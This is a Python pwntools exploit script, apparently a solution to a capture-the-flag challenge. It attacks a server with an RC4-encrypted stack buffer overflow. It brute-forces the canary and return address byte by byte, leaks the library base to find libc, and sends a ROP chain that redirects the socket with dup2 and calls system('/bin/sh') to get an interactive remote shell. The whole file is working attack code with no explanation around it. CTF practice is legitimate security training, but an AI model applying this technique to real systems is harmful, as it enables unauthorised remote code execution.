import sys
from Crypto.Cipher import ARC4
from pwn import *


# context.log_level = "error"
# context.log_level = "debug"


if args.REMOTE:
    log.info("REMOTE")
    HOST, PORT = "pwn.chal.ctf.gdgalgiers.com", 1401
    libc = ELF("./libc.so.6")
    libs_distance = 0x433000

    enc_stack = b""
    # enc_stack = b"\xec\x14x\x12\x13\x0e\x01\xe6"
    # enc_stack += b"\x01" * 16
    # enc_stack += b"\t\xf8\x0e\xb8\xca\xf6I\x8c"
    # enc_stack += b"\x86\x3b\x05\xfb\xb7\xbc\xb1Q"
else:
    log.info("LOCAL")
    HOST, PORT = "127.0.0.1", 1337
    libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
    # libs_distance = 0x949000
    libs_distance = 0x433000

    enc_stack = b""
    # enc_stack = b"\xecGp\x83\x06`\xff0"
    # enc_stack += b"\x01" * 16
    # enc_stack += b"\t?\x1eP\xc9\xf6I\x8c"
    # enc_stack += b'\x86\xcb\xb6 "\xbc\xb1Q'

KEY = b"AAABC"
offset = 256 + 8

# 5 qwords to bruteforce
# canary
# XXXXXXXX
# YYYYYYYY
# rbp
# ret_addr
for i in range(len(enc_stack), 8 * 5):
    for c in range(1, 0x100):
        log.info(f"trying byte {i}: {c:02x}")
        payload = b"A" * offset + enc_stack + bytes([c])
        t = remote(HOST, PORT)
        t.recv()
        t.send(b"2")
        t.recvline()
        t.send(KEY)
        t.recvline()
        t.send(payload)
        # when bruteforcing the ret address
        # same cases will just block the process
        # to avoid that we use a 1s timeout
        buff = t.recvall(timeout=1)

        # This won't be accurate for bruteforcing the return address
        # To get the accurate return address we must calucate the library base address
        # It should be memory aligned (0x00007fXXXXXXX000)
        if b"Output" in buff:
            log.success(f"Found byte {i}: {c:02x}")
            enc_stack += bytes([c])
            log.success(f"enc_stack: {enc_stack}")
            break

log.success(f"enc_stack\n{enc_stack}")
data = b"A" * offset + enc_stack

rc4 = ARC4.new(KEY)

stack = rc4.decrypt(data)
leak = stack[-8:]
ret_addr = u64(leak)
log.success(f"ret_addr: 0x{ret_addr:016x}")

# extracted from a gdb session
ret_addr_offset = 0x33762
lib_base_addr = ret_addr - ret_addr_offset
log.success(f"lib_base_addr: 0x{lib_base_addr:016x}")

# distance between c/c++ extension lib and libc
libc_base = lib_base_addr + libs_distance
log.success(f"libc_base: 0x{libc_base:016x}")

# # test payload locally
# # glibc entry_point "__libc_main"
# libc_main = libc_base + 0x29f50
# new_data = stack[:-8] + p64(libc_main) + p64(ret_addr)

# pop rdi; mov ebx, 0x8948ffff; ret;
pop_rdi = 0x000000000002BA17
# pop rsi; pop rbp; ret;
pop2_rsi = 0x000000000002FF7A
# ret 0;
ret = 0x0000000000010C55

# Client socket file descriptor
SOCKET_FD = 4

new_data = stack[:-8]
new_data += p64(lib_base_addr + pop_rdi)
new_data += p64(SOCKET_FD)
new_data += p64(lib_base_addr + pop2_rsi)
new_data += p64(0)
new_data += p64(0)
new_data += p64(libc_base + libc.symbols["dup2"])

new_data += p64(lib_base_addr + pop_rdi)
new_data += p64(SOCKET_FD)
new_data += p64(lib_base_addr + pop2_rsi)
new_data += p64(1)
new_data += p64(1)
new_data += p64(libc_base + libc.symbols["dup2"])

new_data += p64(lib_base_addr + pop_rdi)
new_data += p64(libc_base + next(libc.search(b"/bin/sh")))
new_data += p64(lib_base_addr + pop2_rsi)
new_data += p64(0)
new_data += p64(0)
new_data += p64(libc_base + libc.symbols["system"])

rc4 = ARC4.new(KEY)
payload = rc4.encrypt(new_data)
log.info(f"payload\n{payload}")

t = remote(HOST, PORT)
t.recv()
t.send(b"2")
t.recvline()
t.send(KEY)
t.recvline()
t.send(payload)
t.interactive()
